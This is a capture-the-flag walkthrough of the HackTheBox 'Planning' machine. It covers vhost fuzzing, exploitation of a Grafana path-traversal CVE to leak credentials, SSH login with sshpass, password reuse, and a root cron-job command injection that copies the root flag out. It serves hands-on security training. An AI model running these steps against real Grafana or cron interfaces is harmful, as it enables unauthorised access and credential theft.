# Planning.htb

### Initial Enumeration

* Open ports: 22 (SSH) and 80 (HTTP)
* Started with basic nmap scan:`nmap -sC -sV -p- planning.htb`

### Virtual Host Discovery

* Used ffuf to fuzz for virtual hosts:

```
  `ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://planning.htb -H "Host: FUZZ.planning.htb" -fc 404`
```

* Discovered `grafana.planning.htb` vhost
* Added to `/etc/hosts`:

```
  `10.10.11.68 planning.htb grafana.planning.htb`
```

### Grafana Analysis

* Browsed to `http://grafana.planning.htb`
* Found Grafana login page
* Tried default credentials (admin:admin) - unsuccessful
* Identified Grafana version vulnerable to CVE-2021-43798 (Path Traversal)

### Exploitation

*
* Further exploited for environment variables
* Retrieved admin credentials from environment:
  * Username: enzo
  * Password: RioTecRANDEntANT!

```css
enzo : RioTecRANDEntANT! P4ssw0rdS0pRi0T3c
```

```sh
sshpass -p 'RioTecRANDEntANT!' ssh enzo@planning.htb
```

## 🧨 Privilege Escalation

While looking for possible paths to escalate privileges, I examined various files and configurations.

### 🔎 Initial Discovery

While checking cron jobs, I found this scheduled task in `/opt/crontabs/crontab.db`:

```json
"command": "zip -P P4ssw0rdS0pRi0T3c ..."
```

This revealed a **hardcoded ZIP password**:

```
P4ssw0rdS0pRi0T3c
```

I kept this in mind for password reuse or protected files.

### 🌐 Port 8000 — Web Interface

I noticed that **port 8000** was open and hosting a **web interface** that required authentication. I tried using:

```
Username: root
Password: P4ssw0rdS0pRi0T3c
```

✔️ **Success** — I was able to log in as `root`.

### ⚙️ Custom Crontab Injection

Inside the authenticated web interface, there was an **input field allowing the creation of new cron jobs**.

This effectively meant **arbitrary command execution as root**.

### 🪓 Root Flag Extraction

I submitted the following payload via the web interface:

```bash
cat /root/root.txt > /zlaga && chmod 777 /zlaga
```

Then, I read the contents of the file:

```bash
cat /zlaga
```

🎉 **Boom. Got the root flag.**
